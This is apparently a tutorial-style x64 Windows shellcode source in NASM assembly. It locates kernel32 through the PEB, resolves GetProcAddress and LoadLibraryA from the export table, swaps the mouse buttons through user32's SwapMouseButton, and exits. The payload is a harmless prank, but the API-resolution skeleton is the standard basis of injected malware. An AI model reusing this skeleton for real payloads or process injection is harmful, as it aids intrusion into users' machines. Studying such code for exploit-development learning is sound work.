BITS 64

SECTION .text
global main
main:
sub 	RSP, 0x28 					;Alloc 40 bytes shadow space (ss)
and 	RSP, 0FFFFFFFFFFFFFFF0h 	; Alight stack to multiple of 16 bytes

xor rcx, rcx             			; RCX = 0
mov rax, [gs:rcx + 0x60] 			; RAX = PEB
mov rax, [rax + 0x18]    			; RAX = PEB->Ldr
mov rsi, [rax + 0x20]    			; RSI = PEB->Ldr.InMemOrder
lodsq                    			; RAX = Second module
xchg rax, rsi            			; RAX = RSI, RSI = RAX
lodsq                    			; RAX = Third(kernel32)
mov rbx, [rax + 0x20]    			; RBX = Base address


; Parse kernel32 PE

xor r8, r8                 ; Clear r8
mov r8d, [rbx + 0x3c]      ; R8D = DOS->e_lfanew offset
mov rdx, r8                ; RDX = DOS->e_lfanew
add rdx, rbx               ; RDX = PE Header
mov r8d, [rdx + 0x88]      ; R8D = Offset export table
add r8, rbx                ; R8 = Export table
xor rsi, rsi               ; Clear RSI
mov esi, [r8 + 0x20]       ; RSI = Offset namestable
add rsi, rbx               ; RSI = Names table
xor rcx, rcx               ; RCX = 0
mov r9, 0x41636f7250746547 ; GetProcA


; Loop through exported functions and find GetProcAddress

Get_Function:

inc rcx                    ; Increment the ordinal
xor rax, rax               ; RAX = 0
mov eax, [rsi + rcx * 4]   ; Get name offset
add rax, rbx               ; Get function name
cmp QWORD [rax], r9        ; GetProcA ?
jnz Get_Function
xor rsi, rsi               ; RSI = 0
mov esi, [r8 + 0x24]       ; ESI = Offset ordinals
add rsi, rbx               ; RSI = Ordinals table
mov cx, [rsi + rcx * 2]    ; Number of function
xor rsi, rsi               ; RSI = 0
mov esi, [r8 + 0x1c]       ; Offset address table
add rsi, rbx               ; ESI = Address table
xor rdx, rdx               ; RDX = 0
mov edx, [rsi + rcx * 4]   ; EDX = Pointer(offset)
add rdx, rbx               ; RDX = GetProcAddress
mov rdi, rdx               ; Save GetProcAddress in RDI


; Use GetProcAddress to find the address of LoadLibrary

mov rcx, 0x41797261          ; aryA
push rcx                     ; Push on stack
mov rcx, 0x7262694c64616f4c  ; LoadLibr
push rcx                     ; Push on stack
mov rdx, rsp                 ; LoadLibraryA
mov rcx, rbx                 ; kernel32.dll base address
sub rsp, 0x30                ; Allocate stack space for function call
call rdi                     ; Call GetProcAddress
add rsp, 0x30                ; Cleanup allocated stack space
add rsp, 0x10                ; Clean space for LoadLibrary string
mov rsi, rax                 ; LoadLibrary saved in RSI


; Load user32.dll using LoadLibraryA

mov rcx, 0x6c6c               ; ll
push rcx                      ; Push on the stack
mov rcx, 0x642e323372657375   ; user32.d
push rcx                      ; Push on stack
mov rcx, rsp                  ; user32.dll
sub rsp, 0x30                 ; Allocate stack space for function call
call rsi                      ; Call LoadLibraryA
add rsp, 0x30                 ; Cleanup allocated stack space
add rsp, 0x10                 ; Clean space for user32.dll string
mov r15, rax                  ; Base address of user32.dll in R15, was in RAX becuase Function Call.


; Call GetProcAddress(user32.dll, "SwapMouseButton")

xor rcx, rcx                  ; RCX = 0
push rcx                      ; Push 0 on stack
mov rcx, 0x6e6f7474754265     ; eButton
push rcx                      ; Push on the stack
mov rcx, 0x73756f4d70617753   ; SwapMous
push rcx                      ; Push on stack
mov rdx, rsp                  ; SwapMouseButton
mov rcx, r15                  ; User32.dll base address
sub rsp, 0x28                 ; Allocate stack space for function call
call rdi                      ; Call GetProcAddress
add rsp, 0x28                 ; Cleanup allocated stack space
add rsp, 0x18                 ; Clean space for SwapMouseButton string
mov r15, rax                  ; SwapMouseButton in R15


; Call SwapMouseButton(true)

mov rcx, 1    ; true
call r15      ; SwapMouseButton(true)


; Call GetProcAddress(kernel32.dll, "ExitProcess")

xor rcx, rcx                 ; RCX = 0
mov rcx, 0x737365            ; ess
push rcx                     ; Push on the stack
mov rcx, 0x636f725074697845  ; ExitProc
push rcx                     ; Push on stack
mov rdx, rsp                 ; ExitProcess
mov rcx, rbx                 ; Kernel32.dll base address
sub rsp, 0x30                ; Allocate stack space for function call
call rdi                     ; Call GetProcAddress
add rsp, 0x30                ; Cleanup allocated stack space
add rsp, 0x10                ; Clean space for ExitProcess string
mov r15, rax                 ; ExitProcess in R15


; Call ExitProcess(0)

mov rcx, 0     ; Exit code 0
call r15       ; ExitProcess(0)